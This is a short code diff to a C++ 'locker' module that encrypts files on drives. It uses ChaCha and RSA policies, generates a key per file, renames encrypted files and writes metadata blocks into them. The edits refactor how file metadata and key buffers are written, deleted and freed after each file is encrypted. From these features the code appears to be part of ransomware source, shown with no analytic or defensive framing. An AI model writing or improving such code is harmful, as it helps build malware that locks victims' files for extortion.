@@ -5,6 +5,7 @@
 #include "global_parameters.h"
 #include "memory.h"
 #include "logs.h"
+#include "pathsystem.h"
 #ifdef _WIN32
 #include "rsa/rsa.h"
 #endif
@@ -471,7 +472,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 
 	if((FileInfo->recent_filename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
 	 	return false;
-
+	
 	if (CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
 	{
 		if (CryptInfo->method_policy == CryptoPolicy::CHACHA
@@ -501,7 +502,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 
-	if ((FileInfo->hblock = filesystem::init_meta_hblock(FileInfo)) == NULL)
+	if (!(FileInfo->hblock = filesystem::init_mdata_hblock(FileInfo)))
 	{
 		LOG_ERROR("[SetOptionFileInfo] [INIT_MEATA_HBLOCK] Failed; %s", data->Filename);
 		return false;
@@ -514,9 +515,11 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 
 void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 {
-	//filesystem::delete_hblock(FileInfo->filehandle, &FileInfo->filesize);
-	if(FileInfo->hblock->crypt)
-		filesystem::add_ecrypt_namend(FileInfo);
+	FileInfo->hblock->crypt == 1 ? 
+		filesystem::write_metadata(FileInfo)
+		:
+		filesystem::delete_metadata(FileInfo->recent_filehandle, &FileInfo->filesize);
+
 	if (FileInfo->filehandle != INVALID_HANDLE_VALUE)
 		api::CloseDesc(FileInfo->filehandle);
 	if (FileInfo->recent_filehandle != INVALID_HANDLE_VALUE)
@@ -533,19 +536,15 @@ void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 
 	memory::m_free(FileInfo->recent_filename);
 	if (FileInfo->crypt_info->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
-	if(success)
-		LOG_SUCCESS("success encrypt file; %s", data->Filename);
-	else
+	
+	success == 1 ?
+		LOG_SUCCESS("success encrypt file; %s", data->Filename)
+		:
 		LOG_ERROR("failed encrypt file; %s", data->Filename);
 
-	memory::memzero_free(FileInfo->hblock->pblock, 256);
-	memory::memzero_free(FileInfo->hblock->ctx, sizeof(laced_ctx));
-	memory::m_free(FileInfo->hblock);
+	filesystem::free_hblock_mdata(FileInfo->hblock);
 	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
-	memory::memzero_free(data->Path, memory::StrLen(data->Path));
-	memory::memzero_free(data->Exst, memory::StrLen(data->Exst));
-	memory::memzero_free(data->Filename, memory::StrLen(data->Filename));
-	memory::memzero_free(data->FullPath, memory::StrLen(data->FullPath));
+	PathSystem::free_driveinfo_st(data);
 }
 
 bool locker::HandlerCrypt
